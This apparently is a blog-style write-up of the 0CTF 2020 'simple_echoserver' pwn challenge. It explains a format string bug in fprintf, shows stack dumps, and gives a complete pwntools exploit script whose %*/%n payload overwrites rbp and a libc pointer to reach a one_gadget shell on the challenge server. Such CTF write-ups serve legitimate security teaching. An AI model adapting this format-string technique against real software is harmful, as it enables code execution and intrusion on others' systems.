@@ -1,0 +1,173 @@
+I"�J<p>We had great time playing this year’s edition of 0CTF 2020. I was mostly working on the challenge <strong>simple_echoserver</strong> which was a fairly simple stack based challenge, but required lot of brute forcing. Sadly , we couldn’t hit the bruteforce on server. Nevertheless , here’s the intended solution for the challenge.</p>
+
+<h2 id="tldr-of-the-challenge-binary">TL;DR OF THE CHALLENGE BINARY</h2>
+
+<p>We’ve been provided with standard <em>x86 64-bit Dynamically Linked</em> binary along with <em>glibc 2.27</em> to start with.</p>
+
+<p>Here’s what <strong>checksec</strong> has to say -</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CANARY</span>    <span class="p">:</span> <span class="n">ENABLED</span>
+<span class="n">FORTIFY</span>   <span class="p">:</span> <span class="n">disabled</span>
+<span class="n">NX</span>        <span class="p">:</span> <span class="n">ENABLED</span>
+<span class="n">PIE</span>       <span class="p">:</span> <span class="n">ENABLED</span>
+<span class="n">RELRO</span>     <span class="p">:</span> <span class="n">FULL</span>
+</code></pre></div></div>
+
+<p>Let’s reverse this now.</p>
+
+<h2 id="reversing">REVERSING</h2>
+
+<p>The binary is a fairly simple one asking us for <strong>name</strong> and <strong>phone number</strong> which it stores on stack and then performs <strong>fprintf</strong> of name through stderr. An important thing to note is that <em>stderr is being directed to /dev/null</em> on server and hence the binary won’t print out name , thereby preventing leaks.</p>
+
+<p>The bug lies in the fprintf where we encounter the infamous <strong>Format String Vulnerability</strong>.</p>
+
+<p>The function asking for Details -&gt;</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">puts</span><span class="p">(</span><span class="s">"For audit, please provide your name and phone number: "</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Your name: "</span><span class="p">);</span>
+  <span class="n">read_name</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Your phone: "</span><span class="p">,</span> <span class="mi">256LL</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<p>This is the function which contains our vulnerable fprintf</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">snprintf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x555555558060LL</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">,</span> <span class="s">"[USER] name: %s; phone: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">256</span><span class="p">));</span>
+  <span class="k">return</span> <span class="nf">fprintf</span><span class="p">(</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x555555558040</span><span class="p">],</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x555555558060LL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>After this , the program loops and echo’s whatever we give as input without any vulnerabilities.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">puts</span><span class="p">(</span><span class="s">"Now enjoy yourself"</span><span class="p">);</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">read_name</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span><span class="s">"~."</span><span class="p">))</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="exploit-idea-and-analysis">EXPLOIT IDEA AND ANALYSIS</h2>
+
+<p>Well , initially we planned to do File Structure overwrite by corrupting stderr’s <em>file_no</em> field with <strong>1</strong> and calling main again would print leaks. But that method looked very cumbersome as it required lots of bruteforcing.</p>
+
+<p>Hence the intended solution is to pop pyell leaklessly.</p>
+
+<p>Let us notice stack at the instance of calling vulnerable printf.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="mi">0000</span><span class="o">|</span> <span class="mh">0x7fffffffebf8</span> <span class="o">--&gt;</span> <span class="mh">0x55555555541a</span> <span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+<span class="mi">0008</span><span class="o">|</span> <span class="mh">0x7fffffffec00</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
+<span class="mi">0016</span><span class="o">|</span> <span class="mh">0x7fffffffec08</span> <span class="o">--&gt;</span> <span class="mh">0x555555558160</span> <span class="o">--&gt;</span> <span class="mh">0x6161616161</span> <span class="p">(</span><span class="s">'aaaaa'</span><span class="p">)</span> <span class="o">-&gt;</span><span class="n">Input</span>
+<span class="mi">0024</span><span class="o">|</span> <span class="mh">0x7fffffffec10</span> <span class="o">--&gt;</span> <span class="mh">0x7fffffffed30</span> <span class="o">--&gt;</span> <span class="mh">0x7fffffffed50</span> <span class="o">--&gt;</span> <span class="mh">0x5555555554e0</span> <span class="p">(</span><span class="n">endbr64</span><span class="p">)</span> <span class="o">-&gt;</span><span class="n">Main</span><span class="s">'s RBP
+0032| 0x7fffffffec18 --&gt; 0x555555555443 (lea    rdi,[rip+0xc5b]        # 0x5555555560a5)
+0040| 0x7fffffffec20 --&gt; 0x0 
+0048| 0x7fffffffec28 --&gt; 0x0 
+0056| 0x7fffffffec30 --&gt; 0x7fffffffed30 --&gt; 0x7fffffffed50 --&gt; 0x5555555554e0 (endbr64)
+0064| 0x7fffffffec38 --&gt; 0x7ffff7dcfa00 --&gt; 0xfbad208b 
+0072| 0x7fffffffec40 --&gt; 0xd68 ('</span><span class="n">h</span>\<span class="sa">r</span><span class="s">')
+0080| 0x7fffffffec48 --&gt; 0x7ffff7a71148 (&lt;_IO_file_underflow+296&gt;:	test   rax,rax)
+0088| 0x7fffffffec50 --&gt; 0xf705fa00 
+0096| 0x7fffffffec58 --&gt; 0xffffffffffffffff 
+0104| 0x7fffffffec60 --&gt; 0x5555555550f0 (endbr64)
+0112| 0x7fffffffec68 --&gt; 0xa ('</span>\<span class="n">n</span><span class="s">')
+0120| 0x7fffffffec70 --&gt; 0x7fffffffed10 --&gt; 0x7fffffffed30 --&gt; 0x7fffffffed50 --&gt; 0x5555555554e0 (endbr64)
+0128| 0x7fffffffec78 --&gt; 0x5555555550f0 (endbr64)
+0136| 0x7fffffffec80 --&gt; 0x7fffffffee30 --&gt; 0x1 
+0144| 0x7fffffffec88 --&gt; 0x0 
+0152| 0x7fffffffec90 --&gt; 0x0 
+0160| 0x7fffffffec98 --&gt; 0x555555555348 (mov    rcx,QWORD PTR [rbp-0x18])
+0168| 0x7fffffffeca0 --&gt; 0x7ffff7dcfa00 --&gt; 0xfbad208b 
+0176| 0x7fffffffeca8 --&gt; 0x7fffffffecb3 --&gt; 0xffee300000000000 
+0184| 0x7fffffffecb0 --&gt; 0x333231 ('</span><span class="mi">123</span><span class="s">') -&gt; Phone Number
+0192| 0x7fffffffecb8 --&gt; 0x7fffffffee30 --&gt; 0x1 
+
+0208| 0x7fffffffecc8 --&gt; 0x7ffff7a723f2 (&lt;_IO_default_uflow+50&gt;:	cmp    eax,0xffffffff)
+0216| 0x7fffffffecd0 --&gt; 0x36 ('</span><span class="mi">6</span><span class="s">')
+0224| 0x7fffffffecd8 --&gt; 0x555555558165 --&gt; 0x0 
+0232| 0x7fffffffece0 --&gt; 0x7fffffffed10 --&gt; 0x7fffffffed30 --&gt; 0x7fffffffed50 --&gt; 0x5555555554e0 (endbr64)
+0240| 0x7fffffffece8 --&gt; 0x55555555528d (mov    r12d,eax)
+0248| 0x7fffffffecf0 --&gt; 0x10055556029 
+
+
+
+</span></code></pre></div></div>
+
+<p>If we close analyse address <strong>0x7fffffffeca8</strong> which also contains a stack pointer <strong>0x7fffffffecb3</strong>, we see that we can control it with the Phone Number that we give as input , so if we give the phone number of <em>length</em> <strong>24</strong>  , then we can make that pointer point to a libc address.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0176</span><span class="o">|</span> <span class="mh">0x7fffffffeca8</span> <span class="o">--&gt;</span> <span class="mh">0x7fffffffecc8</span> <span class="o">--&gt;</span> <span class="mh">0x7ffff7a72300</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_IO_doallocbuf</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nb">cmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="mi">0184</span><span class="o">|</span> <span class="mh">0x7fffffffecb0</span> <span class="p">(</span><span class="s">'0'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">24</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Phone</span> <span class="n">Number</span> <span class="n">of</span> <span class="n">length</span> <span class="mi">24</span>
+<span class="mi">0192</span><span class="o">|</span> <span class="mh">0x7fffffffecb8</span> <span class="p">(</span><span class="s">'0'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">16</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="mi">0200</span><span class="o">|</span> <span class="mh">0x7fffffffecc0</span> <span class="p">(</span><span class="s">"00000000"</span><span class="p">)</span>
+<span class="mi">0208</span><span class="o">|</span> <span class="mh">0x7fffffffecc8</span> <span class="o">--&gt;</span> <span class="mh">0x7ffff7a72300</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_IO_doallocbuf</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nb">cmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="mh">0x0</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Now that we have a libc address , we now corrupt it to point to one_gadget and pivot stack by corrupting rbp
+to point to one_gadget to grant us shell.</p>
+
+<p>After a few attempts , <strong>0xe5863</strong> magic address satisfies and we get shell.</p>
+
+<p>But how do we write one_gadget number of bytes to that address?</p>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">%*</code> format string which is actually used for picking arguments from stack.</p>
+
+<p class="notice">If we can pick arguments from stack , we can add them to constant numbers and get to one_gadget.</p>
+
+<p>So now the plan is ,</p>
+
+<ol>
+  <li>Corrupt rbp to point to our supposed one_gadget.</li>
+  <li>Find the difference between the libc address on stack and one_gadget. This is the number of bytes we need to add to our libc address which we will do with <code class="language-plaintext highlighter-rouge">%*</code>.</li>
+  <li>We calculate the offset and number of bytes to be added and finally use %n to store the result of addition back in the pointer we have to corrupt.</li>
+</ol>
+
+<p>Here’s the exploit script.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'pwnable.org'</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">12020</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">,</span><span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span><span class="o">=</span><span class="bp">True</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./simple_echoserver'</span><span class="p">,</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">},</span><span class="n">stderr</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/dev/null'</span><span class="p">,</span><span class="s">'w+'</span><span class="p">))</span>
+
+<span class="n">reu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">rel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">re</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="c1">#b*0x5555555554d0
+</span>
+<span class="c1">#'%*76$d' + '%73$n')
+</span>
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s">"""
+            b fprintf
+            c
+            """</span><span class="p">)</span>
+    <span class="c1">#rbp is stored at 7th offset , the libc address is stored at offset 30 and the pointer to libc address is stored at 26th offset
+</span>    <span class="n">sla</span><span class="p">(</span><span class="s">"Your name: "</span><span class="p">,</span> <span class="s">'%3c'</span> <span class="o">+</span> <span class="s">'%7$hhn'</span> <span class="o">+</span> <span class="s">'%357715c'</span> <span class="o">+</span> <span class="s">'%*30$c'</span> <span class="o">+</span> <span class="s">'%26$n'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'phone: '</span><span class="p">,</span><span class="s">'0'</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span> <span class="c1">#To get pointer to libc address
+</span>    <span class="n">sla</span><span class="p">(</span><span class="s">'yourself!</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">sl</span><span class="p">(</span><span class="s">'~.'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="conclusion">CONCLUSION</h2>
+
+<p>The challenge has unintended solutions which deal with exploiting <strong>vfprintf</strong> which Ill not be looking into as for now.</p>
+
+<p>Simple challenge with complex tricks , kudos to 0CTF for such a challenge.</p>
+
+:ET
